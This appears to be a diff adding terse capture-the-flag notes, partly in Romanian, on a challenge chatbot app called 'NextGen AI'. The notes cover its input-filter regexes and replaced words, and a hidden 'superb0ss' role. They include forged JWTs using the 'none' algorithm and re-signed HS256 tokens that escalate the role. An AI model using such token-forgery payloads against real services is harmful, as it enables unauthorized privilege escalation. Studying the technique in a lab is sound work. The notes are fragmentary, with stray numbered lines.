@@ -1,0 +1,37 @@
+NextGen AI
+. ba3eab423b1f3ff4df2b8da016084b61 code in url
+. Se filtrează pana acum “<>()[0-9]”
+. Static/js/chatbot.js
+. Regex found
+/[^\w\s]/gi replaced with <empty string>
+/[\d]/gi replaced with <empty string>
+Opening the POST request gives us this message:
+My superior intelligence has noticed that you are doing something weird
+Replaced words:
+/a/
+/I feel /
+/whats/
+/please /
+/ please/
+/r u/
+/allroles/
+allroles returns user,superb0ss
+Jet token has role: user
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoic3VwZXJiMHNzIiwiZ
+XhwIjoxNjM0MzM3MDk3fQ.
+->. JWT with none algorithm
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJiMHNzIn0.j
+cBjGaU-N9koHQvZ8mYKmNi5B-QNmCTejbSUUsodkDw
+
+1
+
+2
+
+3
+
+4
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJiMHNzIn0.f
+JCNV7l5CIfHAvWJD93MrKzScH8ne67LcQyB6uycAcg -> token bun
+
+
